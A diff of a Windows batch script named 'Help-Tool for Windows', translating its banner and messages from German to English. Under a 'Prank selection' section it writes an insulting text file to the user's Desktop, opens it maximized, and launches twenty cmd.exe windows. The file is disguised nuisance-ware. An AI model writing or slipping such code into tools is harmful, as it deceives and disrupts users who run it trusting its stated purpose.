@@ -2,7 +2,7 @@
 
 
 REM Set window title and color scheme
-TITLE LPs Help-Tool for Windows
+TITLE Help-Tool for Windows
 CLS
 COLOR 0A
 
@@ -22,14 +22,14 @@ REM Main Script
 CLS
 
 REM Banner
-ECHO """"""""""""""""""""""""""""""""""""""""""""""""""""""
-ECHO " _     ____      _   _      _     _____           _ "
-ECHO "| |   |  _ \ ___| | | | ___| |_ _|_   _|__   ___ | |"
-ECHO "| |   | |_) / __| |_| |/ _ \ | '_ \| |/ _ \ / _ \| |"
-ECHO "| |___|  __/\__ \  _  |  __/ | |_) | | (_) | (_) | |"
-ECHO "|_____|_|   |___/_| |_|\___|_| .__/|_|\___/ \___/|_|"
-ECHO "                             |_|                    "
-ECHO """"""""""""""""""""""""""""""""""""""""""""""""""""""
+ECHO """"""""""""""""""""""""""""""""""""""
+ECHO " _   _      _     _____           _ "
+ECHO "| | | | ___| |_ _|_   _|__   ___ | |"
+ECHO "| |_| |/ _ \ | '_ \| |/ _ \ / _ \| |"
+ECHO "|  _  |  __/ | |_) | | (_) | (_) | |"
+ECHO "|_| |_|\___|_| .__/|_|\___/ \___/|_|"
+ECHO "             |_|                    "
+ECHO """"""""""""""""""""""""""""""""""""""
 
 ECHO:
 
@@ -133,8 +133,8 @@ REM Prank selection
 
 CLS
 
-ECHO Lukas sagt: Du bist ein Dummkopf. Viel Spaß beim Schließen :) > %USERPROFILE%\Desktop\ICHBINEINDUMMKOPF.txt
-START /MAX notepad.exe %USERPROFILE%\Desktop\ICHBINEINDUMMKOPF.txt
+ECHO Ur an idiot. Have fun closing :) > %USERPROFILE%\Desktop\Iamabigidiotfortrustingalittlebatchscript.txt
+START /MAX notepad.exe %USERPROFILE%\Desktop\Iamabigidiotfortrustingalittlebatchscript.txt
 TIMEOUT /T 5
 
 FOR /L %%i IN (1,1,20) DO START cmd.exe
